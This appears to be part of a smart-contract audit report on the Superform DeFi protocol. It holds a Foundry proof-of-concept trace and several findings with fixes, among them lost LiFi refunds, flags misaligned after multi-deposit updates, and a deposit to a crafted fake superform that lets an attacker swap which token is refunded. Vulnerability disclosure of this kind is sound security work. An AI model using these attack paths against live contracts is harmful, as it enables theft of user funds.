    │   │   │   ├─ [22414] 0x6B175474E89094C44Da98b954EedeAC495271d0F::approve(VaultMock: [0x888A2b1728fCbAFa7958e9040a1bBf043dD31450], 2000000000000000000 [2e18])
    │   │   │   │   ├─ emit Approval(owner: 0xA0c0Bb570A68de6109510C3D59443808B7572982, spender: VaultMock: [0x888A2b1728fCbAFa7958e9040a1bBf043dD31450], value: 2000000000000000000 [2e18])
    │   │   │   │   └─ ← true
    │   │   │   ├─ [65424] VaultMock::deposit(2000000000000000000 [2e18], 0xA0c0Bb570A68de6109510C3D59443808B7572982)
    │   │   │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(VaultMock: [0x888A2b1728fCbAFa7958e9040a1bBf043dD31450]) [staticcall]
    │   │   │   │   │   └─ ← 0
    │   │   │   │   ├─ [19740] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transferFrom(0xA0c0Bb570A68de6109510C3D59443808B7572982, VaultMock: [0x888A2b1728fCbAFa7958e9040a1bBf043dD31450], 2000000000000000000 [2e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0xA0c0Bb570A68de6109510C3D59443808B7572982, to: VaultMock: [0x888A2b1728fCbAFa7958e9040a1bBf043dD31450], value: 2000000000000000000 [2e18])
    │   │   │   │   │   └─ ← true
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xA0c0Bb570A68de6109510C3D59443808B7572982, value: 2000000000000000000 [2e18])
    │   │   │   │   ├─ emit Deposit(caller: 0xA0c0Bb570A68de6109510C3D59443808B7572982, owner: 0xA0c0Bb570A68de6109510C3D59443808B7572982, assets: 2000000000000000000 [2e18], shares: 2000000000000000000 [2e18])
    │   │   │   │   └─ ← 2000000000000000000 [2e18]
    │   │   │   └─ ← 2000000000000000000 [2e18]
    │   │   └─ ← 2000000000000000000 [2e18]
    │   ├─ [1124] SuperRegistry::getAddress(0xba0b74768b1de73590a53e1384870dcbc846e5c73bab23c07d71eaa7cbf8411b) [staticcall]
    │   │   └─ ← SuperPositions: [0xe8E55dB218182396e772e5cD0EDB0355FAe4B574]
    │   ├─ [53290] SuperPositions::mintSingle(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6277101737765918987192496495433682268394204163361895557506 [6.277e57], 2000000000000000000 [2e18])
    │   │   ├─ [1124] SuperRegistry::getAddress(0x3a2f5529773e03d975be44bdae98a8509bdf1159e407504e558536cde56cf6ac) [staticcall]
    │   │   │   └─ ← SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]
    │   │   ├─ emit TransferSingle(operator: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], from: 0x0000000000000000000000000000000000000000, to: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], id: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], value: 2000000000000000000 [2e18])
    │   │   ├─ emit TransferSingle(operator: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], from: 0x0000000000000000000000000000000000000000, to: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], id: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], value: 2000000000000000000 [2e18])
    │   │   └─ ← ()
    │   ├─ emit Completed()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::prank(0x7121207b118BbaCF0340A989527474Bd4495c3C6)
    │   └─ ← ()
    ├─ [27223] SuperformFactory::changeFormImplementationPauseStatus(1, 1, 0x)
    │   ├─ [1124] SuperRegistry::getAddress(0x6b50fa17b77d24e42e27a04b69fe50cd6967cfb767d18de0bd5fe7e1a32aa868) [staticcall]
    │   │   └─ ← SuperRBAC: [0x9BedCF8126E8714bFf169c39Ccf342DcA2aC95B3]
    │   ├─ [1127] SuperRBAC::hasEmergencyAdminRole(0x7121207b118BbaCF0340A989527474Bd4495c3C6) [staticcall]
    │   │   └─ ← true
    │   ├─ emit FormImplementationPaused(formImplementationId: 1, paused: 1)
    │   └─ ← ()
    ├─ [0] VM::selectFork(0)
    │   └─ ← ()
    ├─ [0] VM::prank(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← ()
    ├─ [26463] SuperPositions::increaseAllowance(SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], 6277101737765918987192496495433682268394204163361895557506 [6.277e57], 100000000000000000000 [1e20])
    │   ├─ emit ApprovalForOne(owner: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], id: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 100000000000000000000 [1e20])
    │   └─ ← true
    ├─ [0] VM::prank(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← ()
    ├─ [174308] SuperformRouter::singleDirectSingleVaultWithdraw(SingleDirectSingleVaultStateReq({ superformData: SingleVaultSFData({ superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqRequest: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), permit2data: 0x, hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }) }))
    │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]
    │   │   └─ ← true
    │   ├─ [1124] SuperRegistry::getAddress(0xba0b74768b1de73590a53e1384870dcbc846e5c73bab23c07d71eaa7cbf8411b) [staticcall]
    │   │   └─ ← SuperPositions: [0xe8E55dB218182396e772e5cD0EDB0355FAe4B574]
    │   ├─ [10035] SuperPositions::burnSingle(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6277101737765918987192496495433682268394204163361895557506 [6.277e57], 1000000000000000000 [1e18])
    │   │   ├─ [1124] SuperRegistry::getAddress(0x3a2f5529773e03d975be44bdae98a8509bdf1159e407504e558536cde56cf6ac) [staticcall]
    │   │   │   └─ ← SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]
    │   │   ├─ emit TransferSingle(operator: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], from: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, id: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], value: 1000000000000000000 [1e18])
    │   │   └─ ← ()
    │   ├─ [146503] 0xA0c0Bb570A68de6109510C3D59443808B7572982::directWithdrawFromVault(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [146223] ERC4626Form::directWithdrawFromVault(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0x3a2f5529773e03d975be44bdae98a8509bdf1159e407504e558536cde56cf6ac) [staticcall]
    │   │   │   │   └─ ← SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]        
    │   │   │   │   └─ ← true
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   ├─ [965] SuperformFactory::isFormImplementationPaused(1) [staticcall]
    │   │   │   │   └─ ← true
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xa2d83cf6f43caf068994e5ffe0938f6eabaa551d915b59bfda16ba012d30d968) [staticcall]
    │   │   │   │   └─ ← EmergencyQueue: [0xfaFa0C248d50D89edB2c756AC90A53479cB06974]
    │   │   │   ├─ [127422] EmergencyQueue::queueWithdrawal(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]    
    │   │   │   │   │   └─ ← true
    │   │   │   │   ├─ emit WithdrawalQueued(srcAddress: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], refundAddress: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], id: 1, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], srcPayloadId: 0)
    │   │   │   │   └─ ← ()
    │   │   │   └─ ← 0
    │   │   └─ ← 0
    │   ├─ emit Completed()
    │   └─ ← ()
    ├─ [0] VM::prank(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← ()
    ├─ [120327] SuperformRouter::singleDirectSingleVaultWithdraw(SingleDirectSingleVaultStateReq({ superformData: SingleVaultSFData({ superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqRequest: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), permit2data: 0x, hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }) }))
    │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]
    │   │   └─ ← true
    │   ├─ [1124] SuperRegistry::getAddress(0xba0b74768b1de73590a53e1384870dcbc846e5c73bab23c07d71eaa7cbf8411b) [staticcall]
    │   │   └─ ← SuperPositions: [0xe8E55dB218182396e772e5cD0EDB0355FAe4B574]
    │   ├─ [6428] SuperPositions::burnSingle(MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6277101737765918987192496495433682268394204163361895557506 [6.277e57], 1000000000000000000 [1e18])
    │   │   ├─ [1124] SuperRegistry::getAddress(0x3a2f5529773e03d975be44bdae98a8509bdf1159e407504e558536cde56cf6ac) [staticcall]
    │   │   │   └─ ← SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]
    │   │   ├─ emit TransferSingle(operator: SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9], from: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, id: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], value: 1000000000000000000 [1e18])
    │   │   └─ ← ()
    │   ├─ [124603] 0xA0c0Bb570A68de6109510C3D59443808B7572982::directWithdrawFromVault(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [124323] ERC4626Form::directWithdrawFromVault(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0x3a2f5529773e03d975be44bdae98a8509bdf1159e407504e558536cde56cf6ac) [staticcall]
    │   │   │   │   └─ ← SuperformRouter: [0xdD5F81907b703Ffb2599BBF5FBbd03A856da33a9]
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]        
    │   │   │   │   └─ ← true
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   ├─ [965] SuperformFactory::isFormImplementationPaused(1) [staticcall]
    │   │   │   │   └─ ← true
    │   │   │   ├─ [1124] SuperRegistry::getAddress(0xa2d83cf6f43caf068994e5ffe0938f6eabaa551d915b59bfda16ba012d30d968) [staticcall]
    │   │   │   │   └─ ← EmergencyQueue: [0xfaFa0C248d50D89edB2c756AC90A53479cB06974]
    │   │   │   ├─ [105522] EmergencyQueue::queueWithdrawal(InitSingleVaultData({ payloadId: 0, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], maxSlippage: 100, liqData: LiqRequest({ txData: 0x, token: 0x6B175474E89094C44Da98b954EedeAC495271d0F, interimToken: 0x0000000000000000000000000000000000000000, bridgeId: 1, liqDstChainId: 1, nativeAmount: 0 }), hasDstSwap: false, retain4626: false, receiverAddress: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, extraFormData: 0x }), MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   ├─ [1124] SuperRegistry::getAddress(0xbcc180fb907e9ae431665de4bc74305c00b7b27442aadd477980ecc4bb14c011) [staticcall]
    │   │   │   │   │   └─ ← SuperformFactory: [0x7Bf2E3b9652277dD817816Ef0f7AD072609D7046]
    │   │   │   │   ├─ [885] SuperformFactory::isSuperform(6277101737765918987192496495433682268394204163361895557506 [6.277e57]) [staticcall]    
    │   │   │   │   │   └─ ← true
    │   │   │   │   ├─ emit WithdrawalQueued(srcAddress: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], refundAddress: MorkUser: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], id: 2, superformId: 6277101737765918987192496495433682268394204163361895557506 [6.277e57], amount: 1000000000000000000 [1e18], srcPayloadId: 0)
    │   │   │   │   └─ ← ()
    │   │   │   └─ ← 0
    │   │   └─ ← 0
    │   ├─ emit Completed()
    │   └─ ← ()
    ├─ [429] EmergencyQueue::queueCounter() [staticcall]
    │   └─ ← 2
```

The result shown in the above POC is very strange, because the `if` branch in the `_doSafeTransferAcceptanceCheck` function is not entered, but `to.code.length` is greater than 0

**Recommendation**:

It is recommended that the project party execute a POC to locate the cause of the problem



### H-lack-of-refund-handling-from-lifi-bridge

**Severity:** High risk

**Context:** [BaseRouterImplementation.sol#L188-L188](superform-core/src/BaseRouterImplementation.sol#L188-L188)

- H-lack-of-refund-handling-from-lifi-bridge

[Handling unexpected receiving token](https://docs.li.fi/li.fi-api/li.fi-api/checking-the-status-of-a-transaction#handling-unexpected-receiving-token)

The protocol intends to use lifi to bridge token when there are cross chain deposit / withdraw.

However, as outlined in the lifi documentation,

> REFUNDED: The transfer was not successful and the sent token has been refunded

> When using amarok or hop it can happen that receiving.token is not the token requested in the original quote: amarok mints custom nextToken when bridging and swap them automatically to the token representation the user requested. In rare cases, it can happen that while the transfer was executed, the swap liquidity to exchange that token was used up. In this case, the user receives the nextToken instead. You can go to this webpage to exchange that token later.

> hop mints custom hToken when bridging and swap them automatically to the token representation the user requested. In rare cases, it can happen that while the transfer was executed, the swap liquidity to exchange that token was used up. In this case, the user receives the nextToken instead. You can go to this webpage to exchange that token later

there exists a possibility that a cross-chain transfer might fail, resulting in the token being refunded.

However, there is lack of refund handling from lifi refund.

When the 'msg.sender' is identified as the router during the call, [Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L516)

```solidity
/// @dev dispatches tokens through the selected liquidity bridge to the destination contract
_dispatchTokens(
	superRegistry.getBridgeAddress(args_.liqRequest.bridgeId),
	args_.liqRequest.txData,
	args_.liqRequest.token,
	IBridgeValidator(bridgeValidator).decodeAmountIn(args_.liqRequest.txData, true),
	args_.liqRequest.nativeAmount
);
```
it implies that the refunded token from the Lifi bridge is likely to be lost.

**recommendation**

handle refund when user bridge fund via lifi



### ERC4626KYCDaoForm contract can not hold kycDAO NFT which break the core

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L12

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L31

As the sponsor state above, ERC4626KYCDaoForm contract must hold a kycDAO NFT, which in reality is impossible. There're 2 issues explain why it's impossible for the contract to hold the NFT
- The kycDAO NFT is [non-transferable](https://polygonscan.com/address/0x6bcb9e3559663e2a7269f698dda05ec70b4efb94#code#F1#L494) and only [accept mint NFT directly to the caller](https://polygonscan.com/address/0x6bcb9e3559663e2a7269f698dda05ec70b4efb94#code#F1#L161). There's no method in ERC4626KYCDaoForm contract that can mint kycDAO NFT to itself.
- ERC4626KYCDaoForm contract doesn't implement ERC721Receiver, which is required to hold kycDAO NFT

The impact of not holding the NFT is that the ERC4626KYCDaoForm contract can't surpass [`kycDAO4626.hasKYC()` modifier](https://github.com/superform-xyz/super-vaults/blob/main/src/kycdao-4626/kycdao4626.sol#L37), which make the contract can't deposit or withdraw from the vault, so basically the contract is unusable

**Recommendation**:
- Make a method that call to [kycDAO NFT's `mintWithCode()`](https://polygonscan.com/address/0x6bcb9e3559663e2a7269f698dda05ec70b4efb94#code#F1#L156)
- Implement ERC721Receiver standard






## Medium risk
### `retainERC4626` Flag mishandling in `_updateMultiDeposit`

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Severity: mid

- src issue : [CoreStateRegistry : \_updateMultiDeposit()](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L386)

- Description

- after a multiDeposit cross-chain is arrived to the `coreStateRegistry` , the keeper will update the deposit first , before process it through [updateDepositPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L83) function .

```solidity
  function updateDepositPayload(uint256 payloadId_, uint256[] calldata finalAmounts_) external virtual override {
        _onlyAllowedCaller(keccak256("CORE_STATE_REGISTRY_UPDATER_ROLE"));

        // some code ....

        PayloadState finalState;
        if (isMulti != 0) {
    >>        (prevPayloadBody, finalState) = _updateMultiDeposit(payloadId_, prevPayloadBody, finalAmounts_);
        } else {
            // this will may or may not update the amount n prevPayloadBody .
            (prevPayloadBody, finalState) = _updateSingleDeposit(payloadId_, prevPayloadBody, finalAmounts_[0]);
        }
        // some code ....
    }
```

- in this case the `_updateMultiDeposit` function is responsible for updating the deposit payload by resolving the final amounts given by the keeper and in this process the failed deposits will be removed from the payload body and set to `failedDeposit` to be Rescued later by the user.

```solidity
  function _updateMultiDeposit(
        uint256 payloadId_,
        bytes memory prevPayloadBody_,
        uint256[] calldata finalAmounts_
     )
        internal
        returns (bytes memory newPayloadBody_, PayloadState finalState_)
     {
        /// some code ...

        uint256 validLen;
        for (uint256 i; i < arrLen; ++i) {
            if (finalAmounts_[i] == 0) {
                revert Error.ZERO_AMOUNT();
            }
            // update the amounts :
            (multiVaultData.amounts[i],, validLen) = _updateAmount(
                dstSwapper,
                multiVaultData.hasDstSwaps[i],
                payloadId_,
                i,
                finalAmounts_[i],
                multiVaultData.superformIds[i],
                multiVaultData.amounts[i],
                multiVaultData.maxSlippages[i],
                finalState_,
                validLen
            );
        }
        // update the payload body and remove the failed deposits
        if (validLen != 0) {
            uint256[] memory finalSuperformIds = new uint256[](validLen);
            uint256[] memory finalAmounts = new uint256[](validLen);
            uint256[] memory maxSlippage = new uint256[](validLen);
            bool[] memory hasDstSwaps = new bool[](validLen);

            uint256 currLen;
            for (uint256 i; i < arrLen; ++i) {
                if (multiVaultData.amounts[i] != 0) {
                    finalSuperformIds[currLen] = multiVaultData.superformIds[i];
                    finalAmounts[currLen] = multiVaultData.amounts[i];
                    maxSlippage[currLen] = multiVaultData.maxSlippages[i];
                    hasDstSwaps[currLen] = multiVaultData.hasDstSwaps[i];
                    ++currLen;
                }
            }
            multiVaultData.amounts = finalAmounts;
            multiVaultData.superformIds = finalSuperformIds;
            multiVaultData.maxSlippages = maxSlippage;
            multiVaultData.hasDstSwaps = hasDstSwaps;
            finalState_ = PayloadState.UPDATED;
        } else {
            finalState_ = PayloadState.PROCESSED;
        }
        // return new payload
        newPayloadBody_ = abi.encode(multiVaultData);
    }
```

- An issue arises when some deposits fail, and others succeed. The function doesn't update the `retainERC4626` flags to match the new state.

```diff
    multiVaultData.amounts = finalAmounts;
    multiVaultData.superformIds = finalSuperformIds;
    multiVaultData.maxSlippages = maxSlippage;
    multiVaultData.hasDstSwaps = hasDstSwaps;
    finalState_ = PayloadState.UPDATED;
```

- This misalignment can lead to incorrect minting behavior in the `_multiDeposit` function, where the `retainERC4626` flags do not correspond to the correct `superFormsIds`.

- poc example :

- Bob creates a singleXchainMultiDeposit with Corresponding data and here's some:
  - `superFormsIds[1,2,3,4]`
  - `amounts[a,b,c,d]`
  - `retainERC4626[true,true,false,false]`
- After the cross-chain payload is received and all good, a keeper come and updates the amounts,assuming the update of amounts resulted in `a` and `b` failing, while `c` and `d` are resolved successfully.
- The `_updateMultiDeposit` function updates the payload to contain:
  - `superFormsIds[3,4]`
  - `amounts[c',d']`
  - `retainERC4626[true,true,false,false]`
- here the `retainERC4626` is not updated. in this case When the keeper processes the payload, `_multiDeposit` is triggered, bob is incorrectly minted superPositions for superForms 3 and 4, despite the user's preference to retain ERC-4626 shares for this superForms.

- Impact

- This issue can lead to incorrect minting or unminting behavior of superPosition, where users may receive `superPositions` when they intended to retain ERC-4626 shares, or vice versa.While it may be not a big issue for `EOAs` ,This can be particularly problematic for contracts integrating with Superform, potentially breaking invariants and causing loss of funds.

- Recommendation

The `retainERC4626` flags should be realigned with the updated `superFormsIds` and `amounts` to ensure consistent behavior. A new array for `retainERC4626` should be constructed in parallel with the other arrays to maintain the correct association.

Here is a suggested fix:

```solidity
// Inside the _updateMultiDeposit function
bool[] memory finalRetainERC4626 = new bool[](validLen);
// ... existing code to update superFormsIds and amounts ...

uint256 currLen;
for (uint256 i; i < arrLen; ++i) {
    if (multiVaultData.amounts[i] != 0) {
        // ... existing code to update finalSuperformIds and finalAmounts ...
        finalRetainERC4626[currLen] = multiVaultData.retainERC4626[i];
        ++currLen;
    }
}

// Update the multiVaultData with the new retainERC4626 array
multiVaultData.retainERC4626 = finalRetainERC4626;
```



### Attacker can deposit to non existing superform and change token that should be returned

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
To deposit on another chain user should [call `SuperformRouter.singleXChainSingleVaultDeposit`](https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L44) as option with single vault deposit. Then `BaseRouterImplementation._singleXChainSingleVaultDeposit` function will be called.

User provides `SingleXChainSingleVaultStateReq` param to the function were he can provide all info. One of such info is `superformId`, which is information about superform vault and chain where it is located.

`SuperformRouter.singleXChainSingleVaultDeposit` function then [validates that superfom data](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L135-L147). In case if it's direct deposit or withdraw(on same chain), then function [checks if superform exist](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L778-L780). In our case this check will be skipped as we deposit to another chain. Then it checks [that superform chain is same as destination chain](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L786). And after that there is a check, [that superform implementation is not paused](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L794), which is not important for us.
The function `_validateSuperformData` doesn't have ability to check if superform indeed exists on destination.

`_singleXChainSingleVaultDeposit` function doesn't have any additional checks for the superform, [so it packs superform](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L185) and [then send this to the destination](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L188-L200). This means that user can provide any superform id as deposit target.

In case of xChain deposits all funds should go to the dst swapper or core registry. This is forced by validators(both lifi and socket). Sp in case if you don't do dst swap, then funds will be bridged directly to the `CoreStateRegistry` on destination chain.

When message is relayed and proofs are relayed, then keepers can call `updateDepositPayload` and provide amount that was received from user after bridging. And only after that `processPayload` can be called. `updateDepositPayload` function [will call `_updateSingleDeposit`](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L101) to update amount that is received on destination chain, then [`_updateAmount` will be called](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L474-L485).

In case if there were no dstSwap then [superform is checked to be valid](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L561-L562) and also in case if slippage didn't pass, then code also goes into `if` block. So in our case, if we provided not valid superformId, then we go to the `if` block.

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L561-L562
```solidity
                failedDeposits[payloadId_].superformIds.push(superformId_);

                address asset;
                try IBaseForm(_getSuperform(superformId_)).getVaultAsset() returns (address asset_) {
                    asset = asset_;
                } catch {
                    /// @dev if its error, we just consider asset as zero address
                }
                /// @dev if superform is invalid, try catch will fail and asset pushed is address (0)
                /// @notice this means that if a user tries to game the protocol with an invalid superformId, the funds
                /// bridged over that failed will be stuck here
                failedDeposits[payloadId_].settlementToken.push(asset);
                failedDeposits[payloadId_].settleFromDstSwapper.push(false);

                /// @dev sets amount to zero and will mark the payload as PROCESSED (overriding the previous memory
                /// settings)
                amount_ = 0;
                finalState_ = PayloadState.PROCESSED;
```
Inside this block payload is marked as failed and call to the superform is done to get asset in it. In case if vault has provided asset, then it will be set to the `failedDeposits[payloadId_].settlementToken`. As our superform vault is invalid and can be crafted by attacker it can be crafted in such way to provide more precious token than the one that was deposited by attacker.

